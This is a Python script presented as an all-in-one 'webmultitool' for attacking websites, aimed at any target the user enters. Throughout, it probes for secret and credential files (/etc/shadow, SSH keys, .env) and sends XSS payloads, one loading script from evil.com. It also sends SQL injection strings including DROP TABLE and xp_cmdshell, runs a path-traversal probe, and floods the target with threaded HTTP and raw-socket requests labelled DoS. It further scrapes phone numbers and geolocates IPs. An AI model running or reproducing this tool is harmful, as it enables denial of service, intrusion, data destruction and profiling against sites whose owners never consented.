import os
import requests
from datetime import datetime
import threading
import time
import socket
import re
from urllib.parse import urlparse
import whois

os.system('cls' if os.name == 'nt' else 'clear')

GREEN = "\033[92m"
RED = "\033[91m"
WHITE = "\033[0m"
YELLOW = "\033[93m"

ascii_art = f"""{RED}⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⢿⣿⣿⠏
         webmultitool
        by m1000
{WHITE}"""

print(ascii_art)

def current_time():
    return datetime.now().strftime("%H:%M:%S")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(ascii_art)

def credits():
    print(f"{YELLOW}[{current_time()}] Credits:{WHITE}")
    print(f"{RED}tool by m1000 dont skid it,@9kis on tg{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}") 
    clear_screen()
    main_menu()

def InterestingPath(url):
    paths = [
        "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php", "admin/dashboard.php",
        "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.zip", "backup/site.tar",
        "private", "private/", "private/.env", "private/config.php", "private/secret.txt", "private/keys.pem",
        "uploads", "uploads/", "uploads/file.txt", "uploads/shell.php", "uploads/backup.sql", "uploads/data.zip",
        "api", "api/", "api/v1/", "api/v2/", "api/v1/users", "api/v1/auth", "api/v1/admin",
        "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log", "logs/app.log",
        "test", "test/", "test/test.php", "test/debug.php", "test/info.php", "test/config.ini",
        "server-info", "server-info/", "server-status", "server-status/", "status/", "info/"
    ]
    print(f"{YELLOW}[{current_time()}] searchin paths on  {url}...{WHITE}")
    for path in paths:
        try:
            if not url.endswith("/"):
                url += "/"
            response = requests.get(url + path, timeout=5)
            if response.status_code == 200:
                print(f"{GREEN}[{current_time()}] path hit: /{path} - Status: 200{WHITE}")
            elif response.status_code != 404:
                print(f"{YELLOW}[{current_time()}] weird shi: /{path} - Status: {response.status_code}{WHITE}")
        except:
            print(f"{RED}[{current_time()}] /{path} bad, skipping{WHITE}")

def SensitiveFile(url):
    files = [
        "etc/passwd", "etc/shadow", "etc/hosts", "var/log/auth.log", "var/log/syslog",
        "root/.bash_history", "home/user/.ssh/id_rsa", "www/html/wp-config.php",
        "proc/self/environ", "config/database.yml", ".htaccess", ".git/config",
        "phpinfo.php", "info.php", "test.php", "debug.log", "error.log"
    ]
    print(f"{YELLOW}[{current_time()}] digging for sensitive files...{WHITE}")
    for file in files:
        try:
            if not url.endswith("/"):
                url += "/"
            response = requests.get(url + file, timeout=5)
            if response.status_code == 200:
                print(f"{GREEN}[{current_time()}] file exposed: /{file} - Status: 200{WHITE}")
        except:
            print(f"{RED}[{current_time()}] /{file} crashed, next{WHITE}")

def Xss(url):
    payloads = [
        "<script>alert('m1000')</script>", "<img src=x onerror=alert('m1000')>",
        "<svg/onload=alert('m1000')>", "javascript:alert('m1000')",
        "'><script>alert('m1000')</script>", "<body onload=alert('m1000')>",
        "<iframe src=javascript:alert('m1000')>", "<input onfocus=alert('m1000')>",
        "<script src='http://evil.com/xss.js'></script>", "<a href=javascript:alert('m1000')>Click</a>",
        "<div style='xss:expression(alert(\"m1000\"))'>", "<meta http-equiv='refresh' content='0;javascript:alert(\"m1000\")'>"
    ]
    print(f"{YELLOW}[{current_time()}] testin XSS payloads...{WHITE}")
    for payload in payloads:
        try:
            if not url.endswith("/"):
                url += "/"
            response = requests.get(url + payload, timeout=5)
            if "m1000" in response.text:
                print(f"{GREEN}[{current_time()}] XSS hit! Payload: {payload}{WHITE}")
            else:
                print(f"{RED}[{current_time()}] {payload} didnt worked{WHITE}")
        except:
            print(f"{RED}[{current_time()}] {payload} idk what to say{WHITE}")

def Sql(url):
    payloads = [
        "'", '"', "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
        "admin'--", "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --", "' OR SLEEP(5) --", "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' OR EXISTS(SELECT * FROM users) --", "1; EXEC xp_cmdshell('dir') --", "' OR 'x'='x",
        "' AND SUBSTRING((SELECT @@version),1,1)='M'", "' OR 1=1 LIMIT 1 --",
        "' OR IF(1=1, SLEEP(5), 0) --", "' UNION ALL SELECT NULL, @@version --"
    ]
    error_indicators = ["sql", "mysql", "syntax", "error", "ora-", "sqlite", "postgres"]
    print(f"{YELLOW}[{current_time()}] testing sql {WHITE}")
    for payload in payloads:
        try:
            if not url.endswith("/"):
                url += "/"
            response = requests.get(url + payload, timeout=5)
            if any(error in response.text.lower() for error in error_indicators):
                print(f"{GREEN}[{current_time()}] SQL vuln! Payload: {payload} - Error: {response.text[:50]}{WHITE}")
            else:
                print(f"{RED}[{current_time()}] {payload} didn’t worked{WHITE}")
        except:
            print(f"{RED}[{current_time()}] {payload} crashed, next{WHITE}")

def CodeErrors(url):
    error_indicators = {
        "php warning": "PHP Warning detected",
        "fatal error": "PHP Fatal Error",
        "syntax error": "Syntax buggd",
        "mysql error": "MySQL bugged",
        "division by zero": "Math broke",
        "undefined variable": " not defined",
        "stack trace": "Stack trace leaked",
        "exception": "Exception thrown",
        "error 500": "Server’s crying"
    }
    print(f"{YELLOW}[{current_time()}] lookin code {WHITE}")
    
    try:
        response = requests.get(url, timeout=5)
        content = response.text.lower()
        found = False
        for indicator, desc in error_indicators.items():
            if indicator in content:
                found = True
                print(f"{GREEN}[{current_time()}] Error caught! Type: {desc} - Snippet: {response.text[content.index(indicator):content.index(indicator)+50]}{WHITE}")
        
        payloads = [
            "?debug=1", "?id=-1", "?var='", "?page=<script>", "?data=1/0",
            "?file=../../etc/passwd", "?test=999999999999999", "?include=nonexistent.php"
        ]
        for payload in payloads:
            try:
                test_url = url + payload if "?" in url else url + payload
                response = requests.get(test_url, timeout=5)
                content = response.text.lower()
                for indicator, desc in error_indicators.items():
                    if indicator in content:
                        found = True
                        print(f"{GREEN}[{current_time()}] Payload '{payload}' triggered: {desc} - Snippet: {response.text[content.index(indicator):content.index(indicator)+50]}{WHITE}")
            except:
                print(f"{RED}[{current_time()}] Payload '{payload}' fucked it up{WHITE}")
        
        if not found:
            print(f"{RED}[{current_time()}] No code errors found{WHITE}")
    except:
        print(f"{RED}[{current_time()}] Scan crashed{WHITE}")

def vuln_scan(url):
    if "https://" not in url and "http://" not in url:
        url = "https://" + url
    print(f"{YELLOW}[{current_time()}] starting vuln scan on {url}...{WHITE}")
    InterestingPath(url)
    SensitiveFile(url)
    Xss(url)
    Sql(url)
    CodeErrors(url)
    print(f"{GREEN}[{current_time()}] vuln scan done, tool by m1000{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()

def ddos_scan(url):
    if "https://" not in url and "http://" not in url:
        url = "https://" + url
    print(f"{YELLOW}[{current_time()}] starting DDoS capacity test on {url}...{WHITE}")
    request_count = 0
    success_count = 0
    fail_count = 0
    response_times = []
    lock = threading.Lock()

    def send_request():
        nonlocal request_count, success_count, fail_count, response_times
        try:
            response = requests.get(url, timeout=2)
            with lock:
                request_count += 1
                success_count += 1
                response_times.append(response.elapsed.total_seconds())
            print(f"{GREEN}[{current_time()}] Hit - Status: {response.status_code} - Time: {response.elapsed.total_seconds()}s{WHITE}")
        except:
            with lock:
                request_count += 1
                fail_count += 1
            print(f"{RED}[{current_time()}] Failed request{WHITE}")

    threads = []
    start_time = time.time()
    while time.time() - start_time < 10:
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    time.sleep(10)
    for t in threads:
        t.join(timeout=0)

    avg_response_time = sum(response_times) / len(response_times) if response_times else 0
    success_rate = (success_count / request_count * 100) if request_count > 0 else 0

    print(f"\n{GREEN}[{current_time()}] DDoS Test Report:{WHITE}")
    print(f"{YELLOW}Total Requests: {request_count}{WHITE}")
    print(f"{GREEN}Successful Requests: {success_count}{WHITE}")
    print(f"{RED}Failed Requests: {fail_count}{WHITE}")
    print(f"{YELLOW}Success Rate: {success_rate:.2f}%{WHITE}")
    print(f"{YELLOW}Average Response Time: {avg_response_time:.3f}s{WHITE}")

    if success_rate > 80 and avg_response_time < 1:
        print(f"{GREEN}[{current_time()}] strong resistance{WHITE}")
    elif success_rate > 50 and avg_response_time < 2:
        print(f"{YELLOW}[{current_time()}] mid resistance{WHITE}")
    else:
        print(f"{RED}[{current_time()}] ez ddos {WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()
#tool by m1000 dont skid it 
def dos_website(ip, port):
    print(f"{YELLOW}[{current_time()}] Starting Website DoS on {ip}:{port}...{WHITE}")
    packet_count = 0
    success_count = 0
    fail_count = 0
    lock = threading.Lock()

    def send_packet():
        nonlocal packet_count, success_count, fail_count
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, int(port)))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            sock.close()
            with lock:
                packet_count += 1
                success_count += 1
            print(f"{GREEN}[{current_time()}] Packet sent to {ip}:{port} - Success: {success_count}{WHITE}", end='\r')
        except:
            with lock:
                packet_count += 1
                fail_count += 1
            print(f"{RED}[{current_time()}] Packet failed to {ip}:{port} - Failed: {fail_count}{WHITE}", end='\r')

    threads = []
    start_time = time.time()
    while time.time() - start_time < 10:
        t = threading.Thread(target=send_packet)
        threads.append(t)
        t.start()

    time.sleep(10)
    for t in threads:#tool by m1000 dont skid it 
        t.join(timeout=0)

    print(f"\n{GREEN}[{current_time()}] DoS Attack Report:{WHITE}")
    print(f"{YELLOW}Total Packets Sent: {packet_count}{WHITE}")
    print(f"{GREEN}Successful Packets: {success_count}{WHITE}")
    print(f"{RED}Failed Packets: {fail_count}{WHITE}")
    success_rate = (success_count / packet_count * 100) if packet_count > 0 else 0
    print(f"{YELLOW}Success Rate: {success_rate:.2f}%{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()#tool by m1000 dont skid it 
    main_menu()

def ip_port_scan(url):
    if "https://" in url or "http://" in url:
        url = url.replace("https://", "").replace("http://", "")
    print(f"{YELLOW}[{current_time()}] starting IP and Port scan on {url}...{WHITE}")
    try:
        ip = socket.gethostbyname(url)
        print(f"{GREEN}[{current_time()}] IP Address: {ip}{WHITE}")
    except:
        print(f"{RED}[{current_time()}] Couldn’t resolve IP for {url}{WHITE}")
        input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
        clear_screen()
        main_menu()
        return

    ports = [21, 22, 23, 25, 53, 80, 110, 135, 137, 138, 139, 143, 443, 445, 993, 995, 1080, 1433, 1521, 1723, 3306, 3389, 5432, 5900, 8080, 8443, 27017, 6379, 11211]
    open_ports = []

    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            with lock:
                open_ports.append(port)#tool by m1000 dont skid it 
            print(f"{GREEN}[{current_time()}] Port {port} is open{WHITE}")#tool by m1000 dont skid it 
        sock.close()
#tool by m1000 dont skid it 
    lock = threading.Lock()
    threads = []
    for port in ports:
        t = threading.Thread(target=scan_port, args=(port,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"\n{GREEN}[{current_time()}] Port Scan Report:{WHITE}")
    if open_ports:
        print(f"{GREEN}Open Ports: {', '.join(map(str, open_ports))}{WHITE}")
    else:
        print(f"{RED}No open ports found{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()

def social_finder(url):
    if "https://" not in url and "http://" not in url:
        url = "https://" + url
    print(f"{YELLOW}[{current_time()}] starting Social Finder on {url}...{WHITE}")
    try:
        response = requests.get(url, timeout=5)
        content = response.text
    except:
        print(f"{RED}[{current_time()}] Couldn’t fetch {url}{WHITE}")
        input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
        clear_screen()
        main_menu()
        return

    social_patterns = {
        "Instagram": r"(?:https?:\/\/)?(?:www\.)?instagram\.com\/[A-Za-z0-9_.]+",
        "TikTok": r"(?:https?:\/\/)?(?:www\.)?tiktok\.com\/@[A-Za-z0-9_.]+",
        "Facebook": r"(?:https?:\/\/)?(?:www\.)?facebook\.com\/[A-Za-z0-9_.]+",
        "Twitter": r"(?:https?:\/\/)?(?:www\.)?twitter\.com\/[A-Za-z0-9_]+",
        "LinkedIn": r"(?:https?:\/\/)?(?:www\.)?linkedin\.com\/(?:in|company)\/[A-Za-z0-9_-]+",
        "YouTube": r"(?:https?:\/\/)?(?:www\.)?youtube\.com\/(?:channel\/|user\/)[A-Za-z0-9_-]+",
        "Snapchat": r"(?:https?:\/\/)?(?:www\.)?snapchat\.com\/add\/[A-Za-z0-9_-]+",
        "Pinterest": r"(?:https?:\/\/)?(?:www\.)?pinterest\.com\/[A-Za-z0-9_-]+",
        "Reddit": r"(?:https?:\/\/)?(?:www\.)?reddit\.com\/(?:user|u)\/[A-Za-z0-9_-]+",
        "Twitch": r"(?:https?:\/\/)?(?:www\.)?twitch\.tv\/[A-Za-z0-9_-]+",
        "Discord": r"(?:https?:\/\/)?(?:www\.)?discord\.(?:com\/invite|gg)\/[A-Za-z0-9_-]+",
        "Telegram": r"(?:https?:\/\/)?(?:www\.)?t\.me\/[A-Za-z0-9_-]+",
        "WhatsApp": r"(?:https?:\/\/)?(?:www\.)?wa\.me\/[0-9]+",
        "GitHub": r"(?:https?:\/\/)?(?:www\.)?github\.com\/[A-Za-z0-9_-]+"
    }
    phone_pattern = r"(\+\d{1,3}\s?)?\(?\d{2,3}\)?[\s.-]?\d{3,4}[\s.-]?\d{4}"

    found_socials = {}
    for platform, pattern in social_patterns.items():
        matches = re.findall(pattern, content)
        if matches:
            found_socials[platform] = list(set(matches))

    phones = re.findall(phone_pattern, content)
    phones = list(set(phones))

    print(f"\n{GREEN}[{current_time()}] Social Finder Report:{WHITE}")
    if found_socials:
        for platform, links in found_socials.items():
            print(f"{GREEN}{platform} links found: {', '.join(links)}{WHITE}")
    else:
        print(f"{RED}No social media links found{WHITE}")

    if phones:
        print(f"{GREEN}Phone numbers found: {', '.join(phones)}{WHITE}")
    else:
        print(f"{RED}No phone numbers found{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()
#tool by m1000 dont skid it 
def protection_scan(url):
    if "https://" not in url and "http://" not in url:
        url = "https://" + url
    print(f"{YELLOW}[{current_time()}] starting Protection Scan on {url}...{WHITE}")
    protections = {}

    try:
        response = requests.get(url, timeout=5, allow_redirects=True)
        headers = response.headers
    except:
        print(f"{RED}[{current_time()}] Couldn’t fetch {url}{WHITE}")
        input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
        clear_screen()
        main_menu()
        return
#tool by m1000 dont skid it 
    if "Server" in headers:
        protections["Server"] = headers["Server"]
    if "X-Powered-By" in headers:
        protections["Powered-By"] = headers["X-Powered-By"]
    if "X-Frame-Options" in headers:
        protections["X-Frame-Options"] = headers["X-Frame-Options"]
    if "X-XSS-Protection" in headers:
        protections["X-XSS-Protection"] = headers["X-XSS-Protection"]
    if "X-Content-Type-Options" in headers:
        protections["X-Content-Type-Options"] = headers["X-Content-Type-Options"]
    if "Content-Security-Policy" in headers:
        protections["Content-Security-Policy"] = headers["Content-Security-Policy"]
    if "Strict-Transport-Security" in headers:
        protections["HSTS"] = headers["Strict-Transport-Security"]
    if "CF-RAY" in headers or "cf-cache-status" in headers:
        protections["Cloudflare"] = "Detected"
    if "X-WAF" in headers or any("waf" in key.lower() or "waf" in str(value).lower() for key, value in headers.items()):
        protections["WAF"] = "Detected"
    if "X-Sucuri-ID" in headers or "Sucuri" in headers:
        protections["Sucuri"] = "Detected"

    print(f"\n{GREEN}[{current_time()}] Protection Scan Report:{WHITE}")
    if protections:
        for key, value in protections.items():
            print(f"{GREEN}{key}: {value}{WHITE}")
        if "HSTS" in protections and "X-XSS-Protection" in protections and "X-Content-Type-Options" in protections:
            print(f"{GREEN}[{current_time()}] Site has strong security {WHITE}")
        else:
            print(f"{YELLOW}[{current_time()}] Site has some protections {WHITE}")
    else:
        print(f"{RED}[{current_time()}] Site might be vulnerable{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()

def info_scan(url):
    if "https://" in url or "http://" in url:
        domain = urlparse(url).netloc
    else:
        domain = url
    print(f"{YELLOW}[{current_time()}] starting Info Scan on {domain}...{WHITE}")
    
    try:
        ip = socket.gethostbyname(domain)
        print(f"{GREEN}[{current_time()}] IP Address: {ip}{WHITE}")
    except:
        print(f"{RED}[{current_time()}] Couldn’t resolve IP{WHITE}")
        ip = "Unknown"

    try:
        w = whois.whois(domain)
        info = {
            "Domain Name": w.domain_name,
            "Registrar": w.registrar,
            "Creation Date": w.creation_date,
            "Expiration Date": w.expiration_date,
            "Country": w.country,
            "Name Servers": w.name_servers,
            "Organization": w.org
        }
    except:
        info = {}

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        geo_data = response.json()
        geo_info = {
            "Country": geo_data.get("country", "Unknown"),
            "Region": geo_data.get("regionName", "Unknown"),
            "City": geo_data.get("city", "Unknown"),
            "ISP": geo_data.get("isp", "Unknown")
        }
    except:
        geo_info = {}

    print(f"\n{GREEN}[{current_time()}] Info Scan Report:{WHITE}")
    if info:
        for key, value in info.items():
            if value:
                print(f"{GREEN}{key}: {value}{WHITE}")
    else:
        print(f"{RED}No WHOIS info available{WHITE}")

    if geo_info:
        for key, value in geo_info.items():
            if value:
                print(f"{GREEN}{key}: {value}{WHITE}")
    else:
        print(f"{RED}No geolocation info available{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()
#tool by m1000 dont skid it 
def ip_geolocalisator(ip):
    print(f"{YELLOW}[{current_time()}] Starting IP Geolocalization on {ip}...{WHITE}")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        geo_data = response.json()
        
        if geo_data["status"] == "success":
            geo_info = {
                "IP": geo_data.get("query", ip),
                "Country": geo_data.get("country", "Unknown"),
                "Region": geo_data.get("regionName", "Unknown"),
                "City": geo_data.get("city", "Unknown"),
                "ISP": geo_data.get("isp", "Unknown"),
                "Latitude": geo_data.get("lat", "Unknown"),
                "Longitude": geo_data.get("lon", "Unknown"),
                "Timezone": geo_data.get("timezone", "Unknown")
            }
            print(f"\n{GREEN}[{current_time()}] Geolocalization Report:{WHITE}")
            for key, value in geo_info.items():
                print(f"{GREEN}{key}: {value}{WHITE}")
        else:
            print(f"{RED}[{current_time()}] Failed to geolocate: {geo_data.get('message', 'Unknown error')}{WHITE}")
    except:
        print(f"{RED}[{current_time()}] Error connecting to geolocation service{WHITE}")
    input(f"{YELLOW}[Press Enter to go back to the menu]{WHITE}")
    clear_screen()
    main_menu()
#tool by m1000 dont skid it 
def main_menu():
    print(f"{YELLOW}[{current_time()}] Select an option:{WHITE}")
    print(f"{RED}1. Website Vuln Scanner{WHITE}")
    print(f"{RED}2. Website DDoS Scanner{WHITE}")
    print(f"{RED}3. Website IP and Port Scanner{WHITE}")
    print(f"{RED}4. Website Social Finder{WHITE}")
    print(f"{RED}5. Website Protection Scanner{WHITE}")
    print(f"{RED}6. Website Info Scanner{WHITE}")
    print(f"{RED}7. DoS Attack{WHITE}")
    print(f"{RED}8. IP Geolocalisator{WHITE}")
    print(f"{RED}9. Credits{WHITE}")
    print(f"{RED}10. Leave{WHITE}")
    choice = input(f"{YELLOW}[{current_time()}] Enter choice (1-10): {WHITE}")
    #tool by m1000 dont skid it 
    if choice in ["1", "2", "3", "4", "5", "6"]:
        url = input(f"{YELLOW}[{current_time()}] Target URL -> {WHITE}")
    elif choice == "7":
        ip = input(f"{YELLOW}[{current_time()}] Target IP -> {WHITE}")
        port = input(f"{YELLOW}[{current_time()}] Target Port -> {WHITE}")
    elif choice == "8":
        ip = input(f"{YELLOW}[{current_time()}] Target IP -> {WHITE}")
#tool by m1000 dont skid it 
    if choice == "1":
        vuln_scan(url)
    elif choice == "2":
        ddos_scan(url)
    elif choice == "3":
        ip_port_scan(url)
    elif choice == "4":
        social_finder(url)
    elif choice == "5":
        protection_scan(url)
    elif choice == "6":
        info_scan(url)
    elif choice == "7":
        dos_website(ip, port)
    elif choice == "8":
        ip_geolocalisator(ip)
    elif choice == "9":
        credits()
    elif choice == "10":
        print(f"{GREEN}[{current_time()}] getouttt {WHITE}")
        exit(0)
    else:
        print(f"{RED}[{current_time()}] Invalid choice, try again{WHITE}")
        clear_screen()
        main_menu()
#tool by m1000 dont skid it 
main_menu()
